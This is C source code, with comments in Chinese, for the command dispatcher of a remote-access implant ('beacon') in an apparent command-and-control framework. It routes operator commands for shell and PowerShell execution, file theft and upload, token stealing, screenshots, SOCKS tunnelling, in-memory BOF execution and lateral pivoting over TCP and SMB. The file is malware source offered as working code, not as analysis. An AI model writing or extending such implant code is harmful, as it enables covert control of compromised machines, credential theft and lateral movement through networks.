#include "beacon_commands.h"
#include "beacon_cascade.h"

/*
 * 命令分发中心：
 * dispatcher 只负责按 command_id 路由，不在这里实现具体业务逻辑。
 * 返回的 PacketList 由 Agent 层统一包装、加密并放入出站队列。
 */

/* 根据 command_id 将信标命令分发到对应的处理函数 */
PacketList CommandDispatch(BeaconContext* ctx, UINT32 task_id, UINT32 command_id, const ByteBuf* payload)
{
    Parser p;
    PacketList out;
    ParserInit(&p, payload->data, payload->len);
    PlistInit(&out);

    switch (command_id) {

    /* 休眠 / 抖动 */
    case BEACON_COMMAND_SLEEP:
        if (ParserU32(&p) == 0) {
            PlistAdd(&out, BbFromText("sleep requires at least 1 argument"));
        } else {
            ByteBuf msg;
            ctx->profile.sleep_ms = (INT)ParserU32(&p);
            if (ParserLeft(&p) >= 4) ctx->profile.jitter = (INT)ParserU32(&p);
            BbInit(&msg);
            BbPrintf(&msg, "Sleep policy updated: Interval=%dms, Jitter=%d%%, hInstance=%p",
                     ctx->profile.sleep_ms, ctx->profile.jitter, ctx->image_base);
            PlistAdd(&out, msg);
        }
        break;

    /* 退出信标 */
    case BEACON_COMMAND_EXIT:
        out.should_exit = 1;
        PlistAdd(&out, BbFromText("Beacon exit command processed. Goodbye."));
        break;

    /* Shell 执行 */
    case BEACON_COMMAND_SHELL:
        PlistAdd(&out, CommandShell(ctx, task_id, command_id, &p, 0));
        break;
    case BEACON_COMMAND_POWERSHELL:
        PlistAdd(&out, CommandShell(ctx, task_id, command_id, &p, 1));
        break;

    /* 文件系统操作 */
    case BEACON_COMMAND_CD:
        PlistAdd(&out, CommandCd(&p));
        break;
    case BEACON_COMMAND_LS:
        PlistAdd(&out, CommandLs(&p));
        break;
    case BEACON_COMMAND_PWD:
        PlistAdd(&out, CommandPwd());
        break;
    case BEACON_COMMAND_CAT:
        PlistAdd(&out, CommandCat(&p));
        break;
    case BEACON_COMMAND_MKDIR:
        PlistAdd(&out, CommandMkdir(&p));
        break;
    case BEACON_COMMAND_RM:
        PlistAdd(&out, CommandRm(&p));
        break;
    case BEACON_COMMAND_MV:
        PlistAdd(&out, CommandMv(&p));
        break;
    case BEACON_COMMAND_CP:
        PlistAdd(&out, CommandCp(&p));
        break;

    /* 文件传输 */
    case BEACON_COMMAND_DOWNLOAD:
        PlistFree(&out);
        out = TransferHandleDownload(ctx, task_id, &p);
        break;
    case BEACON_COMMAND_UPLOAD:
        PlistAdd(&out, TransferHandleUpload(ctx, task_id, &p));
        break;

    /* 进程管理 */
    case BEACON_COMMAND_PS:
        PlistAdd(&out, CommandPs());
        break;
    case BEACON_COMMAND_KILL:
        PlistAdd(&out, CommandKill(&p));
        break;

    /* 令牌模拟 */
    case BEACON_COMMAND_STEALTOKEN:
        PlistAdd(&out, CommandStealToken(&p));
        break;

    /* 系统信息 */
    case BEACON_COMMAND_WHOAMI:
        PlistAdd(&out, CommandWhoami(ctx));
        break;
    case BEACON_COMMAND_NETINFO:
        PlistAdd(&out, CommandNetinfo());
        break;
    case BEACON_COMMAND_NETSTAT:
        PlistAdd(&out, CommandNetstat());
        break;

    /* 文件浏览器 / 属性 */
    case BEACON_COMMAND_FILEBROWSER:
        PlistAdd(&out, CommandFilebrowser(&p));
        break;
    case BEACON_COMMAND_SETATTR:
        PlistAdd(&out, CommandSetattr(&p));
        break;
    case BEACON_COMMAND_ZIP:
        PlistAdd(&out, CommandZip(&p));
        break;

    /* 作业管理 */
    case BEACON_COMMAND_JOBS:
        PlistAdd(&out, CommandJobs(ctx));
        break;
    case BEACON_COMMAND_KILLJOB:
        PlistAdd(&out, CommandKillJob(ctx, &p));
        break;

    /* 截图 */
    case BEACON_COMMAND_SCREENSHOT:
        PlistAdd(&out, CommandScreenshot(&p));
        break;

    /* SOCKS 隧道 */
    case BEACON_COMMAND_TUNNEL_START:
        PlistFree(&out);
        out = TunnelHandleStart(ctx, task_id, &p);
        break;
    case BEACON_COMMAND_TUNNEL_CONTROL:
        PlistFree(&out);
        out = TunnelHandleControl(&ctx->tunnels, &p, NULL);
        break;
    case BEACON_COMMAND_TUNNEL_DATA:
        PlistFree(&out);
        out = TunnelHandleData(&ctx->tunnels, &p);
        break;
    case BEACON_COMMAND_TUNNEL_CLOSE:
        PlistFree(&out);
        out = TunnelHandleControl(&ctx->tunnels, &p, "close");
        break;

    /* BOF 执行 */
    case BEACON_COMMAND_BOF:
        PlistFree(&out);
        out = CommandBofHandle(ctx, task_id, &p);
        break;

    /* 级联 */
    case BEACON_COMMAND_CASCADE_CONNECT_TCP:
        PlistAdd(&out, CascadeHandleConnectTcp(ctx, &p));
        break;
    case BEACON_COMMAND_CASCADE_LINK_SMB:
        PlistAdd(&out, CascadeHandleLinkSmb(ctx, &p));
        break;
    case BEACON_COMMAND_CASCADE_ROUTE:
        PlistAdd(&out, CascadeHandleRoute(ctx, &p));
        break;
    case BEACON_COMMAND_CASCADE_CLOSE:
        PlistAdd(&out, CascadeHandleClose(ctx, &p));
        break;

    /* PostEx 子协议 */
    case BEACON_COMMAND_POSTEX:
        PlistAdd(&out, PostExHandle(ctx, task_id, &p));
        break;

    /* 未知命令 */
    default:
        {
            ByteBuf msg;
            BbInit(&msg);
            BbPrintf(&msg, "command id %lu not registered", (ULONG)command_id);
            PlistAdd(&out, msg);
        }
        break;
    }
    return out;
}
